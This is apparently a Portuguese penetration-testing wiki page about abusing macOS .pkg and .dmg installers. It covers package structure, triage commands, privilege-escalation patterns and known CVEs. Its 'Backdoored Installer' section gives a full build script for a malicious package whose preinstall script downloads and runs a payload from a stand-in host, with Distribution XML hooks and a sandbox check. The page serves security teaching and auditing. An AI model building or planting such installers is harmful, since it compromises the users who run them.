# Abuso de instaladores do macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informações básicas de Pkg

Um **pacote de instalação** do macOS (também conhecido como arquivo `.pkg`) é um formato de arquivo usado pelo macOS para **distribuir software**. Esses arquivos são como uma **caixa que contém tudo de que um software** precisa para ser instalado e executado corretamente.

O próprio arquivo do pacote é um archive que contém uma **hierarquia de arquivos e diretórios que serão instalados no computador** de destino. Ele também pode incluir **scripts** para executar tarefas antes e depois da instalação, como configurar arquivos de configuração ou remover versões antigas do software.

### Hierarquia

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizações (título, texto de boas-vindas…) e verificações de scripts/instalação
- **PackageInfo (xml)**: Informações, requisitos de instalação, localização da instalação, paths para scripts a serem executados
- **Bill of materials (bom)**: Lista de arquivos a serem instalados, atualizados ou removidos, com permissões de arquivo
- **Payload (CPIO archive gzip compressed)**: Arquivos a serem instalados em `install-location` a partir de PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Scripts de pré e pós-instalação e mais recursos extraídos para um diretório temporário para execução.

### Descomprimir
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Para visualizar o conteúdo do installer sem descompactá-lo manualmente, você também pode usar a ferramenta gratuita [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Atalhos para triagem estática

Se o objetivo for a análise, tente **evitar abrir o pacote primeiro com `Installer.app`**. Alguns pacotes podem executar código assim que o Installer os abre (por exemplo, via `system.run()` ou plug-ins do installer), portanto, a extração offline geralmente é o ponto de partida mais seguro.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Informações básicas sobre DMG

Os arquivos DMG, ou Apple Disk Images, são um formato de arquivo usado pelo macOS da Apple para imagens de disco. Um arquivo DMG é essencialmente uma **imagem de disco montável** (contém seu próprio filesystem) que contém dados brutos de blocos, normalmente compactados e, às vezes, criptografados. Quando você abre um arquivo DMG, o macOS o **monta como se fosse um disco físico**, permitindo acessar seu conteúdo.

> [!CAUTION]
> Observe que os instaladores **`.dmg`** suportam **tantos formatos** que, no passado, alguns deles que continham vulnerabilidades foram abusados para obter **execução de código no kernel**.

### Hierarquia

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

A hierarquia de um arquivo DMG pode variar com base no conteúdo. No entanto, para DMGs de aplicativos, ela geralmente segue esta estrutura:

- Nível superior: Esta é a raiz da imagem de disco. Ela geralmente contém o aplicativo e possivelmente um link para a pasta Applications.
- Aplicativo (.app): Este é o aplicativo propriamente dito. No macOS, um aplicativo normalmente é um pacote que contém vários arquivos e pastas individuais que compõem o aplicativo.
- Link para Applications: Este é um atalho para a pasta Applications no macOS. O objetivo é facilitar a instalação do aplicativo. Você pode arrastar o arquivo .app para esse atalho para instalar o aplicativo.

## Privesc via abuso de pkg

### Execução a partir de diretórios públicos

Se um script de pré ou pós-instalação, por exemplo, for executado a partir de **`/var/tmp/Installerutil`**, e um atacante puder controlar esse script, ele poderá escalar privilégios sempre que ele for executado. Ou outro exemplo semelhante:<sup>[[1]](#references)[[3]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Esta é uma [função pública](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que vários instaladores e updaters chamarão para **executar algo como root**. Essa função aceita o **path** do **arquivo** a ser **executado** como parâmetro; no entanto, se um atacante pudesse **modificar** esse arquivo, ele poderia **abusar** de sua execução com root para **escalar privilégios**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Para mais informações, confira esta palestra: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Abuso de ambiente e shebang

Bugs modernos do PackageKit mostraram que os scripts dos instaladores frequentemente são executados como **código root confiável**, enquanto ainda mantêm um contexto controlado pelo atacante nas proximidades. Ao auditar pacotes de fornecedores, preste atenção especial a:

- Interpretadores de shell, como `#!/bin/zsh` / `#!/bin/bash`
- Chamadas como `sudo -u $USER`, `launchctl asuser` ou qualquer lógica que confie em `$USER`, `$HOME`, `PATH`, `TMPDIR` ou caminhos relativos
- Interpretadores que não são shell e que podem carregar arquivos de inicialização ou bibliotecas controlados pelo usuário
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Para o bug de root environment do PackageKit de 2024 (herança de `~/.zshenv` / `~/.bash*` durante instalações iniciadas pelo usuário), consulte [a página genérica de macOS privesc](../macos-privilege-escalation.md). Se o package for **Apple-signed**, o mesmo bug de script pode se tornar **relevante para SIP/TCC**, pois `system_installd` pode carregar `com.apple.rootless.install.heritable`; consulte [a página de SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)[[6]](#references)</sup>

### Execução por montagem

Se um instalador escrever em `/tmp/fixedname/bla/bla`, é possível **criar um mount** sobre `/tmp/fixedname` com noowners, permitindo **modificar qualquer arquivo durante a instalação** para abusar do processo de instalação.

Um exemplo disso é o **CVE-2021-26089**, que conseguiu **sobrescrever um script periódico** para obter execução como root. Para mais informações, consulte a palestra: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg como malware

### Payload vazio

É possível simplesmente gerar um arquivo **`.pkg`** com **scripts de pre e post-install**, sem nenhum payload real além do malware dentro dos scripts.

### JS em Distribution xml

É possível adicionar tags **`<script>`** ao arquivo **distribution xml** do package, e esse código será executado; ele pode **executar comandos** usando **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Em packages de distribution, isso geralmente depende de o arquivo `Distribution` de nível superior habilitar scripts externos, por exemplo, com `allow-external-scripts="true"`. Portanto, revisar apenas `preinstall` / `postinstall` não é suficiente: o próprio **Distribution XML** pode conter hooks `installation-check` / `volume-check` e caminhos de execução diretos para `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Instalador malicioso usando um script e código JS dentro de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Referências

- [1] [DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Breaking SIP with Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Death By 1000 Installers on macOS and it's all broken!](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
